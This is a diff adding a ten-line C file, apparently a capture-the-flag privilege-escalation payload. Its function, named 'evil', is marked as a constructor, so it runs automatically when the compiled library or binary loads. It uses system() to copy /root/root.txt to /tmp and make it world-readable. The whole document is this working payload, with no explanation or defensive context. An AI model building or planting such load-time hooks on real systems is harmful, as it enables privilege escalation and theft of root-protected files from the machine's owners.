@@ -1,0 +1,10 @@
+#include<stdio.h>
+#include<stdlib.h>
+
+void __attribute__((constructor)) evil();
+
+void main() {};
+
+void evil() {
+      system("cp /root/root.txt /tmp/ && chmod 0644 /tmp/root.txt");
+}
